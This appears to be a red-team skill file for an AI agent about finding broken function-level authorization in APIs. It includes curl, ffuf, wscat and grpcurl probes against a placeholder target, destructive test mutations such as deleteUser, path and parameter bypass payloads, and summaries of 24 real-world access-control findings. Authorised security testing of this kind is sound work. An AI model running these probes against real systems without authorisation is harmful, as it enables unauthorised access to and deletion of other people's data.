---
name: hunt-broken-function-level-auth
description: Hunt broken function-level authorization via verb drift, route shadowing, and transport gaps. Plus BAC surface playbook (protection classification, implicit/explicit fuzz, dup-key tamper, write-gap) → references/bac-surface-mindmap.md.
category: redteam
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, ffuf
tags: [redteam, authorization, function-level, API, verb-drift, route-shadowing]
related_skills:
  - hunt-idor
  - hunt-auth-bypass
  - hunt-api-misconfig
---

# Broken Function Level Authorization

Hunt for endpoints where authorization is enforced at the controller/middleware level but bypassed through HTTP verb drift, legacy routes, shadow endpoints, or transport protocol inconsistencies. Unlike IDOR (object-level), this targets ACTION-level authorization — can a user invoke admin functions despite lacking the admin role.

## When to Use

- API has distinct user roles (admin, moderator, user) but role checks are per-controller, not per-method.
- Legacy or deprecated endpoints still served behind updated middleware.
- GraphQL, gRPC, and WebSocket transports exist alongside REST APIs without authorization parity.
- Feature flags or beta endpoints expose functionality before security review.
- Batch/job endpoints accept internal requests without role verification.

## Quick Detection

```bash
# Verb drift: try PUT/DELETE on endpoints that return 403 on GET
for method in GET POST PUT PATCH DELETE OPTIONS; do
  curl --max-time 30 --connect-timeout 10 -sk -X "$method" "https://target.com/api/admin/users" -w "$method %{http_code}\n" -o /dev/null
done
```

## Procedure

### Phase 1 — HTTP Verb Drift

```bash
# Admin endpoints — each HTTP method may have different auth
ENDPOINTS=(
  "/api/admin/users"
  "/api/admin/settings"
  "/api/manage/orders"
  "/api/internal/config"
)

for ep in "${ENDPOINTS[@]}"; do
  for method in GET POST PUT PATCH DELETE; do
    curl --max-time 30 --connect-timeout 10 -sk -X "$method" "https://target.com$ep" \
      -w "$method $ep — %{http_code}\n" -o /dev/null
  done
  # Also try custom methods
  curl --max-time 30 --connect-timeout 10 -sk -X "PURGE" "https://target.com$ep" -o /dev/null -w "PURGE — %{http_code}\n"
  curl --max-time 30 --connect-timeout 10 -sk -X "DEBUG" "https://target.com$ep" -o /dev/null -w "DEBUG — %{http_code}\n"
done
```

### Phase 2 — Route Shadowing

```bash
# Legacy routes that bypass modern middleware
for path in "/api/v0/" "/api/v1/" "/api/legacy/" "/api/internal/" "/api/beta/" \
            "/api/mobile/" "/api/partner/" "/api/integration/" "/api/webhook/"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com${path}users" -w "%{http_code} — $path\n" -o /dev/null
done

# ffuf for route discovery
ffuf -u "https://target.com/api/FUZZ/users" \
  -w /path/to/prefixes.txt \
  -mc 200,301,401,403
```

### Phase 3 — Feature Flag Bypass

```bash
# Beta/preview endpoints often lack authorization
for flag in "beta" "preview" "canary" "experimental" "new" "v2" "preview"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/${flag}/admin" -w "%{http_code} — $flag\n" -o /dev/null
done

# Feature flags in headers or cookies
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
  -H "X-Feature-Flags: admin" \
  -H "X-Experimental: true" \
  -H "X-Beta-Access: 1"
```

### Phase 4 — Batch & Job Endpoints

```bash
# Batch operations may skip per-item authorization
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/batch" \
  -H "Content-Type: application/json" \
  -d '{"operations":[{"method":"DELETE","path":"/users/1"},{"method":"GET","path":"/admin/logs"}]}'

# Background job endpoints
for path in "/api/jobs" "/api/tasks" "/api/cron" "/api/queue" "/api/workers"; do
  curl --max-time 30 --connect-timeout 10 -sk "https://target.com${path}/admin-cleanup" -w "%{http_code} — $path\n" -o /dev/null
done
```

### Phase 5 — Transport Protocol Inconsistency

```bash
# GraphQL — check if mutations allow admin actions without role check
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id: 1) { success } }"}'

# WebSocket — actions sent over WS may skip REST middleware
# Test via wscat
echo '{"type":"DELETE_USER","payload":{"userId":1}}' | wscat -c "wss://target.com/ws"

# gRPC — reflection may expose admin methods
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext target.com:50051 admin.UserService/DeleteUser
```

### Phase 6 — Content-Type Middleware Gaps

```bash
# Different content types may hit different parsers/middleware
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
  -H "Accept: application/xml" \
  -H "Content-Type: application/xml" \
  -d '<user><name>test</name></user>'

curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/users" \
  -H "Content-Type: multipart/form-data" \
  -F "name=test"
```

## Pitfalls

- **405 Method Not Allowed ≠ no auth.** The method must exist AND lack authorization to be a finding.
- **Route shadowing requires the shadow endpoint to accept authenticated requests.** A public user-info endpoint is not a finding.
- **GraphQL `deleteUser` on a consumer-facing mutation is an IDOR, not BFLA.** BFLA is about action-level privileges, not object ownership.
- **WebSocket authorization bypass requires proof that the WS handler skips REST middleware checks.** Compare WS vs REST for the same action.

## MDPsec Verified Patterns (all 14 BAC reports from mdpsec.com)

Real-world primitives from mdpsec.com reports:

1. **Selective filter chain (403-vs-400 signature)** — Spring Security filter chain is selective, not default-deny: `curl /api/users` → 403 "Access Denied" (filter intercepts) vs `/api/users/csv` → 400 "Required String parameter 'jwtToken' is not present" (controller validator ran = filter forwarded). Internal operator controllers outside any matching rule run with no authentication; sibling controllers on same host return 403 → gap unambiguous (11).
2. **Reachable unauth surface behind the gap** — full OpenAPI spec `/api/api-docs` (170 endpoints), OTP SMS dispatcher, 6 data export controllers (subscriber CSV, location history CSV, live SMS stream, file exports), 3 admin login endpoints; username-enumeration oracle via differential responses ("user is locked or not found" vs other) (11).
3. **Role-check-only authorization** — auth checks valid login token but never checks the permission row: rider token (`"role":{"global":["rider"]}`) → fleet endpoints 200 (781 active rentals, 226 zone configs, 200 fleet tasks) while separate admin endpoint → 401 "Missing required scopes" — proves RBAC middleware exists but was not applied to the fleet endpoints (96).
4. **Staging/prod auth asymmetry** — staging assistant API serves production data with no auth while prod returns 401 (35).
5. **200-vs-401 route split on healthcare booking** — booking routes return 200 while sibling config/admin routes on the same service return 401; bogus bearer still 200 → auth never evaluated (52).
6. **Write acceptance without authz** — PUT/POST on protected-looking writes return 400 domain-validation errors (passed security filter, reached business logic), never 401/403 (52).
7. **Client-side session ID = auth theater** — chatbot `generateSessionId()` → `${date}-${random()}` never validated server-side; only `platform` brand id required; phone→SIM lookup mass sweep (12).
8. **Admin endpoints bound to public interface** — feature-toggle service debug/monitoring endpoints return 200 with no auth: 116 feature flags, token inventory with wildcard production client token, segment definitions leak 23 privileged user ID hashes + SSO user IDs; flag-evaluation with leaked enterprise userId flips SSO/testnet; token-validation endpoint = brute-force oracle (42).
9. **Transport info reveals missing session guard** — data-explorer `{"websocket":true,"origins":["*:*"],"cookie_needed":false}` → renders data with no login while siblings enforce session validation (53).
10. **Read-only role mints/destroys agents** — agent management endpoints authorize on session validity + account membership only; NO permission row exists for any role → documented read-only "reviewer" role can DELETE admin-owned agents (204) and POST new ones; provisioning response carries auth token → live mTLS certificate to orchestrator (88).
11. **Missing auth + invalid token still 200** — user-service endpoints perform no auth; succeed with a clearly invalid bearer token → auth not enforced anywhere in the chain; device register/delete/re-register → push notification takeover (114).
12. **Fake bearer token identical 200** — `GET /api/drivers/nearby` no API key/session/CAPTCHA; fake bearer returns identical 200; ~40 sibling routes return 401/403 → only this route open (115).
13. **Entitlement bypass with no check** — `POST /rewards/mint-perk` returns signed URL usable with no session; INELIGIBLE wallet receives same signed URL as paying member; expiryDate verbatim into signed token (93).
14. **Cross-tenant role-level-only checks** — `POST /team/user/remove` + `DELETE /team/{teamId}` gated only on "caller has team-level ADMIN role" — no hierarchy/creator protection → cross-tenant guest admin evicts creator then hard-deletes team; tenant-level senior-admin role provides no override (109).
15. **Wildcard WebSocket channel ACL** — real-time messaging proxy grants every authenticated session subscribe+publish on the ENTIRE classroom channel namespace; other namespaces return permissions violation → broken per-session scope, not open broker (124).
16. **Supabase RLS intent proof** — INSERT blocked but SELECT/UPDATE/DELETE open → developers intended to restrict anonymous access; policies incomplete (106); anon-role RPC with empty params → bulk cross-tenant invoice dump (107).
17. **IP allowlist checks raw path** — `/./metrics` bypasses fleet A (strips leading dot-segment), `/metrics/` bypasses fleet B; combined `/./metrics/` + `--path-as-is` defeats both (63).
18. **Single unauth route among gated siblings** — `GET /internal/dashboard` 200 unauth while stats/users/volume/reserves/disputes all 401; `dt_produced_next` timestamp proves live data (112).
19. **Private-app permission self-approval (18)** — GraphQL mutation `mutation($a:ID!){ approvePrivateAppScopes(applicationID:$a, response: APPROVED) }` carries only applicationID + response, never checks caller is the installing merchant; read-denied vs approve-allowed asymmetry on same object; approval flips whole pending permission set to granted; developer then mints app access token carrying self-granted scopes → victim merchant's owner/admin account 200.
20. **KMS encrypt/decrypt without role guard (20, 29)** — `POST /kms/encrypt` + `/kms/decrypt` proxy to cloud KMS with no role guard under a single global CMK with no per-tenant EncryptionContext; every sibling endpoint returns 403 for tenant tokens while these two return 201 and run; ciphertext prefix identical across tenants (shared key); decrypt succeeding without context proves none bound; tenant A encrypts → tenant B decrypts → victim's secrets byte-for-byte.
21. **Unauth org-scoped provisioning (31)** — `POST /api/iam/v1/orgs/{org_id}/businesses` accepted unauthenticated requests with attacker-chosen org_id + business_type (no auth header/captcha/rate limit/invitation) → provisions real partner manager account, activation link emailed to attacker, ~70% of probed org ids accepted; `business_type` accepted 5 internal staff role names, invalid values echoed full enum.
22. **Hasura anonymous role (51)** — public GraphQL endpoint with anonymous role granted unrestricted read on production tables; introspection + real-time subscriptions enabled for unauth callers; wallet claims table ~250,000 records walkable by integer PK; 80,000 push tokens; live subscriptions watch new registrations.
23. **Paywall feed access control (70)** — one content feed endpoint returns complete body HTML of premium articles to anonymous clients while public article pages correctly enforce paywall and every sibling feed endpoint requires auth; `Cache-Control: public` on gated content; unpublished records present.
24. **Guest directory shared pool (110)** — standard traveller account creates login-capable external guest via `POST /api/guests`; guest lands in the SHARED individual-accounts pool regardless of creator; take over via forgot-password → `GET /api/directory` → 800,000+ traveller records (id, email, fullName, companyDomain, office, policy level) while guest's own access check returns `hasAccess: false`; paging to last offset still returns real record (genuine dataset).

Cross-ref `mdpsec-report-knowledge` for the full index.

## Verification

1. A lower-privilege user invokes an admin-only action via an unguarded HTTP method, shadow route, or transport protocol.
2. The action succeeds (not just returns a different error — actually performs the operation).
3. The same action via the standard path (REST GET/POST) correctly returns 403.
4. Document the specific method, endpoint, and transport protocol that bypasses authorization.

## Full-Surface BAC Checklist (Mind Map — new reference)

**Trigger:** load when mapping/abusing authorization on any REST API, or whenever a 403 "should" be 200.
**Priority order:** classify protections (404/403/no-access-mode) → fuzz values + structure (encoding/case/dot-segment) → tamper (dup keys, case, extension, verb) → write-gap (extra param on DELETE/PATCH).

📄 **Playbook:** [`references/bac-surface-mindmap.md`](references/bac-surface-mindmap.md) — every step as Why → Test → Payload → Verdict → Severity → Chain. Payloads are generic templates; verify before claiming.

Key additions from the mind map:

- **Protection classification**: map each endpoint to `404` (non-existent), `403` (permission check), or **no-access-mode** (silently blocks → verb/param tamper candidate).
- **Implicit vs explicit fuzzing**: implicit = value fuzz (`/api/users/41`, `?msg_id=43`); explicit = structure fuzz (encoded separators `%26`/`%23`/`%2f`, dot-segments `/.%2f13`, **case confusion `Userld` vs `userId`**).
- **JSON duplicate keys** (parameter pollution): `{"id":"9999","id":"5543"}` — first/last wins by parser → mass-assignment bypass.
- **Extension append** (`.json`, `.config`) and **verb tamper** — different handler/authorization per route.
- **Real-world value set**: UUIDs, **null UUID** (`00000000-0000-0000-0000-000000000000`), emails as IDs (`/users/namos.toooo@gmail.com`), MongoDB IDs.
- **Canonical write-gap** (chain with `hunt-write-gap`):
  ```
  DELETE /api/v1/messages/54          → 200
  DELETE /api/v1/messages/105         → 404
  DELETE /api/v1/messages/105?user=100 → 200   ← extra user param overrides ownership
  ```
  SQL shape: `DELETE FROM messages WHERE id=54 AND (from_user=77886 OR to_user=77886)` — the OR-window is itself a bug; test both `from_user` and `to_user` directions.

## Related Skills

- **`hunt-idor`** — Object-level authorization (accessing other users' data).
- **`hunt-auth-bypass`** — Complete authentication bypass patterns.
- **`hunt-api-misconfig`** — API-level misconfigurations including transport gaps.
- **`hunt-write-gap`** — Read-protected write-gaping endpoints (PATCH/POST/DELETE without authorization); home of the `?user=100` delete-bypass pattern.
